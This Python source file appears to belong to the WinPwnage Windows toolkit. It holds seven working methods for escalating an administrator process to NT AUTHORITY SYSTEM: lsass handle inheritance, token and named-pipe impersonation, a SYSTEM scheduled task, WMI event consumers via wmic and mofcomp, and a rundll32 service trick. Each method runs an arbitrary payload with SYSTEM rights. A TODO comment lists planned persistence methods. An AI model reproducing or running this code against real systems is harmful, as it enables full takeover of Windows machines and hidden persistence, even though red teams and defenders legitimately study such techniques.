import datetime
import tempfile
import time

from .utils import *
from .winstructures import *

"""TODO
review:
{path!r} instead "{path}"
return or raise in log.error
fix remove registry for prevent windows errors.

add-persist:
UserInit method in hkcu
common startup folder


test:
E:/Program Files/PUTTY /c calc
cmd /c calc
cmds /c calc
"""

# Creds to: https://gist.github.com/highsenburger69/acc7b1b4589e51905a93db46ac5f81b2

elevate1_info = {
    "Description": "Elevate from administrator to NT AUTHORITY SYSTEM using handle inheritance",
    "Method": "Handle inheritance",
    "Id": "1",
    "Type": "Elevation",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "elevate1",
    "Function Payload": True,
}


def elevate1(payload):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    ret = 0

    hToken = HANDLE(c_void_p(-1).value)
    log.debug("Grabbing and modifying current process token")
    if not OpenProcessToken(GetCurrentProcess(), (0x00000020 | 0x00000008), byref(hToken)):
        log.error(f"Couldn't get process token. Error in OpenProcessToken: {GetLastError()}")
        return

    log.debug("Locate LUID for specified privilege")
    luid = LUID()
    if not LookupPrivilegeValue(None, "SeDebugPrivilege", byref(luid)):
        log.error(f"Couldn't lookup privilege value. Error in LookupPrivilegeValue: {GetLastError()}")
        return

    log.debug("Modifying token structure to enable SeDebugPrivilege")
    tp = TOKEN_PRIVILEGES()
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = 0x00000002

    if not AdjustTokenPrivileges(hToken, False, byref(tp), sizeof(tp), None, None):
        log.error(f"Couldn't enabled or disable the privilege. Error in AdjustTokenPrivileges: {GetLastError()}")
        return

    log.info(f"Adjusted SeDebugPrivilege privileges for the current process PID: {GetCurrentProcessId()}")
    CloseHandle(hToken)

    while True:
        DWORD_array = (DWORD * 0xFFFF)
        ProcessIds = DWORD_array()
        ProcessIdsSize = sizeof(ProcessIds)
        BytesReturned = DWORD()
        if EnumProcesses(ProcessIds, ProcessIdsSize, BytesReturned) and BytesReturned.value < ProcessIdsSize:
            break

    RunningProcesses = int(BytesReturned.value / sizeof(DWORD))
    for process in range(RunningProcesses):
        ProcessId = ProcessIds[process]
        hProcess = OpenProcess(0x1000, False, ProcessId)
        if hProcess:
            ImageFileName = (c_char * MAX_PATH)()
            if GetProcessImageFileName(hProcess, ImageFileName, MAX_PATH) > 0:
                if os.path.basename(ImageFileName.value) == b"lsass.exe":
                    pid = ProcessId
                    log.debug(f"Found lsass.exe to act as PROC_THREAD_ATTRIBUTE_PARENT_PROCESS")
                    log.debug(f"PID of our to be parent process: {ProcessId}")
                    break
        CloseHandle(hProcess)

    handle = OpenProcess(PROCESS_ALL_ACCESS, False, int(ProcessId))
    if not handle:
        log.error(f"Error in OpenProcess: {GetLastError()}")

    log.debug(f"Acquired handle to lsass.exe process")
    Size = SIZE_T(0)
    InitializeProcThreadAttributeList(None, 1, 0, byref(Size))
    if not Size.value:
        log.error(f"Error in NULL InitializeProcThreadAttributeList: {GetLastError()}")

    log.debug("Building empty attribute list")
    dwSize = len((BYTE * Size.value)())
    AttributeList = PROC_THREAD_ATTRIBUTE_LIST()
    if not InitializeProcThreadAttributeList(AttributeList, 1, 0, byref(Size)):
        log.error(f"Error in InitializeProcThreadAttributeList: {GetLastError()}")

    log.debug(f"Size of memory block used to store attributes: {dwSize}")
    log.debug("Allocating and initializing a AttributeList")
    lpvalue = PVOID(handle)
    if not UpdateProcThreadAttribute(AttributeList, 0, (0 | 0x00020000), byref(lpvalue), sizeof(lpvalue), None, None):
        log.error(f"Error in UpdateProcThreadAttribute: {GetLastError()}")

    log.debug("Inheriting the handle of the privileged process for CreateProcess")
    lpStartupInfo = STARTUPINFOEX()
    lpStartupInfo.StartupInfo.cb = sizeof(lpStartupInfo)
    lpStartupInfo.lpAttributeList = addressof(AttributeList)
    lpProcessInformation = PROCESS_INFORMATION()
    if not CreateProcess(None, " ".join(payload), None, None, 0, (0x00000010 | 0x00080000), None, None, byref(lpStartupInfo), byref(lpProcessInformation)):
        log.error(f"Error in specifying privileged parent process in CreateProc: {GetLastError()}")
    else:
        ret = 1
        log.info(f"Successfully elevated process PID: {lpProcessInformation.dwProcessId}")

    CloseHandle(handle)
    DeleteProcThreadAttributeList(AttributeList)
    return ret


# Creds to: https://gist.github.com/highsenburger69/147a16dd003b2fd1eacd9afcd1d0fe7f

elevate2_info = {
    "Description": "Elevate from administrator to NT AUTHORITY SYSTEM using token impersonation",
    "Method": "Token impersonation",
    "Id": "2",
    "Type": "Elevation",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "elevate2",
    "Function Payload": True,
}


def elevate2(payload):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    params = " ".join(payload[1:])
    payload = payload[0]

    log.debug("Enabling SeDebugPrivilege")
    hToken = HANDLE(c_void_p(-1).value)
    if not OpenProcessToken(GetCurrentProcess(), (TOKEN_ALL_ACCESS | TOKEN_PRIVS), byref(hToken)):
        log.error(f"Error while grabbing GetCurrentProcess()'s token: {GetLastError()}")

    tp = TOKEN_PRIVILEGES2()
    tp.PrivilegeCount = 1
    tp.Privileges = (20, 0, 0x00000002)

    if not AdjustTokenPrivileges(hToken, False, byref(tp), 0, None, None):
        log.error(f"Error while assigning SE_DEBUG_NAME to GetCurrentProcess()'s token': {GetLastError()}")
    else:
        log.info("Successfully enabled SeDebugPrivilege")

    DWORD_array = (DWORD * 0xFFFF)
    ProcessIds = DWORD_array()
    ProcessIdsSize = sizeof(ProcessIds)
    ProcessesReturned = DWORD()
    EnumProcesses(ProcessIds, ProcessIdsSize, ProcessesReturned)

    RunningProcesses = int(ProcessesReturned.value / sizeof(DWORD))
    for process in range(RunningProcesses):
        ProcessId = ProcessIds[process]
        currenthandle = OpenProcess(PROCESS_QUERY_INFORMATION, False, ProcessId)
        if not currenthandle:
            continue
        ProcessName = (c_char * 260)()
        if GetProcessImageFileName(currenthandle, ProcessName, 260):
            ProcessName = ProcessName.value.split(b"\\")[-1]
            processToken = HANDLE(c_void_p(-1).value)
            OpenProcessToken(currenthandle, TOKEN_PRIVS, byref(processToken))
            TokenInformation = (c_byte * 4096)()
            ReturnLength = DWORD()
            GetTokenInformation(processToken, TOKEN_INFORMATION_CLASS.TokenUser, byref(TokenInformation), sizeof(TokenInformation), byref(ReturnLength))
            Token = cast(TokenInformation, POINTER(TOKEN_USER))
            StringSid = LPSTR()
            ConvertSidToStringSidA(Token.contents.User.Sid, byref(StringSid))
            hTokendupe = HANDLE(c_void_p(-1).value)
            DuplicateTokenEx(processToken, TOKEN_ALL_ACCESS, None, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, byref(hTokendupe))
            ImpersonateLoggedOnUser(hTokendupe)
            log.debug("Impersonating System IL token")
            lpStartupInfo = STARTUPINFO()
            lpStartupInfo.cb = sizeof(lpStartupInfo)
            lpProcessInformation = PROCESS_INFORMATION()
            lpStartupInfo.dwFlags = 0x00000001
            lpStartupInfo.wShowWindow = 5

            if not CreateProcessWithToken(hTokendupe, 0x00000002, payload, params, 0x00000010, None, None, byref(lpStartupInfo), byref(lpProcessInformation)):
                log.error(f"Error while triggering admin payload using CreateProcessWithLogonW: {GetLastError()}")
            else:
                log.info(f"Successfully elevated process PID: {lpProcessInformation.dwProcessId}")
                return 1


# Creds to: https://gist.github.com/highsenburger69/09b816daa16f020d188c289fd401b0b2

elevate3_info = {
    "Description": "Elevate from administrator to NT AUTHORITY SYSTEM using named pipe impersonation",
    "Method": "Named pipe impersonation",
    "Id": "3",
    "Type": "Elevation",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "elevate3",
    "Function Payload": True,
}


def Service(*args):
    service_name = b"WinPwnage"
    service_bin = rb"%COMSPEC% /c ping -n 5 127.0.0.1 >nul && echo 'WinPwnage' > \\.\pipe\WinPwnagePipe"

    serviceDBHandle = OpenSCManager(rb"\\localhost", b"ServicesActive", 0x0001 | 0x0002)
    if not serviceDBHandle:
        log.error(f"Error while connecting to the local service database using OpenSCManager: {GetLastError()}")
        return

    schService = CreateService(
        serviceDBHandle, service_name,
        None, (0x00020000 | 0x00040000 | 0x0010), 0x00000010,
        0x00000003, 0x00000000, service_bin,
        None, None, None, None, None
    )
    if not schService:
        log.error(f"Error while creating our service using CreateService: {GetLastError()}")
        return
    else:
        log.debug("Successfully created service")

    serviceHandle = OpenService(serviceDBHandle, service_name, 0x0010)
    if not StartService(serviceHandle, 0, None):
        log.error("Unable to start service, attempting rollback")
        if not DeleteService(serviceHandle):
            log.error("Unable to delete service, manual cleaning is needed!")
        else:
            log.info("Successfully deleted service")
    else:
        log.info("Successfully started service")

    CloseServiceHandle(serviceDBHandle)
    CloseServiceHandle(schService)


def delete_service():
    serviceDBHandle = OpenSCManager(rb"\\localhost", b"ServicesActive", 0x0001)

    log.debug("Performing cleanup")
    serviceHandle = OpenService(serviceDBHandle, b"WinPwnage", 0x00010000)

    if not DeleteService(serviceHandle):
        log.error("Unable to delete service, manual cleaning is needed!")
    else:
        log.info("Successfully deleted service")

    CloseServiceHandle(serviceDBHandle)


def elevate3(payload):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    params = " ".join(payload[1:])
    payload = payload[0]
    ret = 0

    hPipe = CreateNamedPipe(rb"\\.\pipe\WinPwnagePipe", 0x00000003, 0x00000000 | 0x00000000, 255, 0, 0, 0, None)
    if not hPipe:
        log.error(f"Error while creating our named pipe using CreateNamedPipe: {GetLastError()}")
        return
    else:
        log.info("Successfully created Named Pipe")

    RunService = CFUNCTYPE(None, POINTER(INT))(Service)
    log.debug("Running service function in another thread, waiting for cmd.exe to send data to pipe")
    cThread = CreateThread(None, 0, RunService, None, 0, None)
    if not cThread:
        log.error(f"Error while Creating thread in the virtual space of the current process to mimick a client/server interaction like a multi-thread named pipe server using CreateThread: {GetLastError()}")
        return

    CloseHandle(cThread)

    if not ConnectNamedPipe(hPipe, None):
        log.error(f"Error while waiting the client to trigger a connection in the Named Pipe using ConnectNamedPipe: {GetLastError()}")
        return
    else:
        log.info("Connected to Named Pipe")

    log.debug("Receiving payload from pipe")
    ReadFile(hPipe, 0, 0, None, None)

    if not ImpersonateNamedPipeClient(hPipe):
        log.error(f"Error while impersonating the access token at the end of the pipe using ImpersonateNamedPipeClient: {GetLastError()}")
        delete_service()
        return
    else:
        log.info("Impersonated  the client's security context")

    hToken = HANDLE(c_void_p(-1).value)
    if not OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, False, byref(hToken)):
        log.error(f"Error while opening our thread's token using OpenThreadToken: {GetLastError()}")
        delete_service()
        return
    else:
        log.info("Opened our current process's thread token")

    log.debug("Converting token into a primary token")
    hPrimaryToken = HANDLE(c_void_p(-1).value)
    if DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, None, SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, TOKEN_TYPE.TokenPrimary, byref(hPrimaryToken)) == STATUS_UNSUCCESSFUL:
        log.error(f"Error while trying to convert the token into a primary token using DuplicateTokenEx with SecurityDelegation: {GetLastError()}")
        log.debug("Switching to different security impersonation level to SecurityImpersonation")
        if DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, None, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, byref(hPrimaryToken)) == STATUS_UNSUCCESSFUL:
            log.error(f"Error while trying to convert the token into a primary token using DuplicateTokenEx with SecurityImpersonation: {GetLastError()}")
            delete_service()
            return
        else:
            log.info("Successfully converted token into a primary token using DuplicateTokenEx with SecurityImpersonation")
    else:
        log.info("Successfully converted token into a primary token using DuplicateTokenEx with SecurityDelegation")

    log.debug("Attempting to create elevated process")
    lpStartupInfo = STARTUPINFO()
    lpStartupInfo.cb = sizeof(lpStartupInfo)
    lpProcessInformation = PROCESS_INFORMATION()
    lpStartupInfo.dwFlags = 0x00000001
    lpStartupInfo.wShowWindow = 5
    if not CreateProcessAsUser(hPrimaryToken, None, payload, params, None, False, 0, None, None, byref(lpStartupInfo), byref(lpProcessInformation)):
        log.error(f"Error while triggering payload using CreateProcessAsUser {GetLastError()}")
        log.debug("Switching create process method to CreateProcessWithToken")
        if not CreateProcessWithToken(hPrimaryToken, 0x00000002, payload, params, 0x00000010, None, None, byref(lpStartupInfo), byref(lpProcessInformation)):
            log.error(f"Error while triggering payload using CreateProcessWithToken: {GetLastError()}")
        else:
            log.info(f"Successfully elevated process PID: {lpProcessInformation.dwProcessId} using CreateProcessWithToken")
            ret = 1
    else:
        log.info(f"Successfully elevated process PID: {lpProcessInformation.dwProcessId} using CreateProcessAsUser")
        ret = 1

    delete_service()
    return ret


elevate4_info = {
    "Description": "Elevate from administrator to NT AUTHORITY SYSTEM using schtasks.exe (non interactive)",
    "Method": "Malicious scheduled task that gets deleted once used",
    "Id": "4",
    "Type": "Elevation",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "elevate4",
    "Function Payload": True,
}


def elevate4(payload):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    xml_template = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <RegistrationInfo>
        <Date>{str(datetime.datetime.now()).replace(' ', 'T')}</Date>
        <URI>\\Microsoft\\Windows\\elevator</URI>
    </RegistrationInfo>
    <Triggers>
        <LogonTrigger>
            <Enabled>true</Enabled>
        </LogonTrigger>
    </Triggers>
    <Principals>
        <Principal id="Author">
            <UserId>S-1-5-18</UserId>
            <RunLevel>HighestAvailable</RunLevel>
        </Principal>
    </Principals>
    <Settings>
        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
        <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
        <AllowHardTerminate>false</AllowHardTerminate>
        <StartWhenAvailable>true</StartWhenAvailable>
        <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
        <IdleSettings>
            <StopOnIdleEnd>true</StopOnIdleEnd>
            <RestartOnIdle>false</RestartOnIdle>
        </IdleSettings>
        <AllowStartOnDemand>true</AllowStartOnDemand>
        <Enabled>true</Enabled>
        <Hidden>false</Hidden>
        <RunOnlyIfIdle>false</RunOnlyIfIdle>
        <WakeToRun>false</WakeToRun>
        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
        <Priority>7</Priority>
        <RestartOnFailure>
            <Interval>PT2H</Interval>
            <Count>999</Count>
        </RestartOnFailure>
    </Settings>
    <Actions Context="Author">
        <Exec>
            <Command>"{" ".join(payload)}"</Command>
        </Exec>
    </Actions>
</Task>"""

    ret = 0
    temp = os.path.join(tempfile.gettempdir(), "elevator.xml")
    try:
        xml_file = open(temp, "w")
        xml_file.write(xml_template)
        xml_file.close()
    except Exception as error:
        return

    time.sleep(5)

    if not os.path.isfile(temp):
        log.error("Unable to create scheduled task, xml file not found")
        return

    if create("schtasks.exe", params=f"/create /xml {temp} /tn elevator"):
        log.info("Successfully created scheduled task")
    else:
        log.error("Unable to create scheduled task")
        return

    if create("schtasks.exe", params="/run /tn elevator"):
        log.info("Successfully ran scheduled task")
        ret = 1
    else:
        log.error("Unable to run scheduled task")

    time.sleep(5)

    log.debug("Performing cleanup")
    if create("schtasks.exe", params="/delete /tn elevator"):
        log.info("Successfully deleted scheduled task")
    else:
        log.error("Unable to delete scheduled task")

    try:
        os.remove(temp)
        log.info("Successfully deleted xml file")
    except Exception as error:
        pass

    return ret


elevate5_info = {
    "Description": "Elevate from administrator to NT AUTHORITY SYSTEM using wmic.exe (non interactive)",
    "Method": "Handle inheritance",
    "Id": "5",
    "Type": "Elevation",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "elevate5",
    "Function Payload": True,
}


def elevate5(payload):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    cmds_create = [
        ('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"'),
        ('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="{path}", CommandLineTemplate="{path}"'),
        ('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding CREATE Filter=\'__EventFilter.Name="BotFilter82"\', Consumer=\'CommandLineEventConsumer.Name="BotConsumer23"\''),
    ]
    cmds_delete = [
        ('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter WHERE Name="BotFilter82" DELETE'),
        ('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer WHERE Name="BotConsumer23" DELETE'),
        ('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding WHERE Filter=\'__EventFilter.Name="BotFilter82"\' DELETE'),
    ]
    ret = 1

    for x in cmds_create:
        exit_code = create("wmic.exe", params=x[1].format(path=" ".join(payload)), get_exit_code=True)
        if not exit_code:
            log.info(f"Successfully {x[0]} (exit code: {exit_code})")
        else:
            ret = 0
            log.error(f"Unable to {x[0]} (exit code: {exit_code})")

    log.debug("Waiting for (15) seconds for payload to get executed")
    time.sleep(15)

    log.debug("Performing cleanup")
    for x in cmds_delete:
        exit_code = create("wmic.exe", params=x[1].format(path=" ".join(payload)), get_exit_code=True)
        if not exit_code:
            log.info(f"Successfully deleted {x[0]} (exit code: {exit_code})")
        else:
            log.error(f"Unable to delete {x[0]} (exit code: {exit_code})")

    return ret


elevate6_info = {
    "Description": "Elevate from administrator to NT AUTHORITY SYSTEM using Windows Service (non interactive)",
    "Method": "Malicious Windows Service that gets deleted once used",
    "Id": "6",
    "Type": "Elevation",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "elevate6",
    "Function Payload": True,
}


def elevate6(payload):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    servicename = b"WinPwnage"
    localhost = rb"\\localhost"
    ret = 0

    log.debug("Installing service")
    schSCManager = OpenSCManager(localhost, b"ServicesActive", 0x0001 | 0x0002)
    if not schSCManager:
        log.error(f"Error while connecting to the local service database using OpenSCManager: ({GetLastError()})")
        return

    schService = CreateService(
        schSCManager, servicename, None, 0x00020000 | 0x00040000 | 0x0010, 0x00000010, 0x00000003, 0x00000000,
        bytes(f"rundll32.exe {os.path.join(system_directory(), 'zipfldr.dll')},RouteTheCall {' '.join(payload)}", encoding="utf-8"),
        None, None, None, None, None
    )
    if not schService:
        log.error(f"Error while installing our service using CreateService: ({GetLastError()})")
        return
    else:
        log.info(f"Successfully installed service ({servicename}) using CreateService")

    CloseServiceHandle(schSCManager)
    CloseServiceHandle(schService)

    schSCManager = OpenSCManager(localhost, b"ServicesActive", 0x0001 | 0x0002)
    if not schSCManager:
        log.error(f"Error while connecting to the local service database using OpenSCManager: ({GetLastError()})")
        return

    # The service will fail, but the payload will spawn anyway
    svcHandle = OpenService(schSCManager, servicename, 0x0010)
    if not StartService(svcHandle, 0, None):
        log.info(f"Successfully triggered service ({servicename}) to load ({' '.join(payload)})")
        ret = 1
    else:
        log.error(f"Unable to trigger service ({servicename}) to load ({' '.join(payload)})")

    CloseServiceHandle(schSCManager)
    CloseServiceHandle(svcHandle)

    log.debug("Performing cleanup")
    schSCManager = OpenSCManager(localhost, b"ServicesActive", 0x0001 | 0x0002)
    if not schSCManager:
        log.error(f"Error while connecting to the local service database using OpenSCManager: ({GetLastError()})")

    svcHandle = OpenService(schSCManager, servicename, 0x00010000)
    if DeleteService(svcHandle):
        log.info(f"Successfully deleted service ({servicename})")
    else:
        log.error(f"Unable to delete service ({servicename})")

    CloseServiceHandle(schSCManager)
    CloseServiceHandle(svcHandle)
    return ret


elevate7_info = {
    "Description": "Elevate from administrator to NT AUTHORITY SYSTEM using mofcomp.exe (non interactive)",
    "Method": "Malicious mof file using EventFilter EventConsumer and binding that gets deleted once used",
    "Id": "7",
    "Type": "Elevation",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "elevate7",
    "Function Payload": True,
}


def elevate7(payload):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    mof_template = '''#PRAGMA AUTORECOVER
#PRAGMA NAMESPACE ("\\\\\\\\.\\\\root\\\\subscription")

instance of __EventFilter as $Filt
{
Name = "WinPwnageEventFilter";
Query = "SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'";
QueryLanguage = "WQL";
EventNamespace = "root\\\\cimv2";
};

instance of CommandLineEventConsumer as $Cons
{
Name = "WinPwnageConsumer";
RunInteractively=false;
CommandLineTemplate="''' + " ".join(payload).replace(os.sep, os.sep*2) + '''";
};

instance of __FilterToConsumerBinding
{
Filter = $Filt;
Consumer = $Cons;
};'''
    temp = os.path.join(tempfile.gettempdir(), "elevator.mof")
    ret = 0
    try:
        mof_file = open(temp, "w")
        mof_file.write(mof_template)
        mof_file.close()
        log.info(f"Successfully wrote mof template to disk ({temp})")
    except Exception:
        log.error(f"Cannot proceed, unable to write mof file to disk ({temp})")
        return

    time.sleep(5)

    if not os.path.isfile(temp):
        log.error(f"Unable to locate mof template on disk ({temp})")
        return
    if not create("mofcomp.exe", params=temp, get_exit_code=True):
        log.info("Successfully compiled mof file using mofcomp")
        ret = 1
    else:
        log.error(f"Unable to compile mof file containing our payload ({' '.join(payload)})")

    log.debug("Waiting for (15) seconds for payload to get executed")
    time.sleep(15)

    log.debug("Performing cleaning")
    try:
        os.remove(temp)
        log.info("Successfully removed mof file from temporary directory")
    except Exception as error:
        log.error("Unable to remove mof file from temporary directory")

    cmds = [
        ('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter WHERE Name="WinPwnageEventFilter" DELETE'),
        ('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer WHERE Name="WinPwnageConsumer" DELETE'),
        ('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding WHERE Filter=\'__EventFilter.Name="WinPwnageEventFilter"\' DELETE')
    ]

    for cmd in cmds:
        exit_code = create("wmic.exe", params=cmd[1], get_exit_code=True)
        if not exit_code:
            log.info(f"Successfully removed {cmd[0]} (exit code: {exit_code})")
        else:
            log.error(f"Unable to removed {cmd[0]} (exit code: {exit_code})")

    return ret
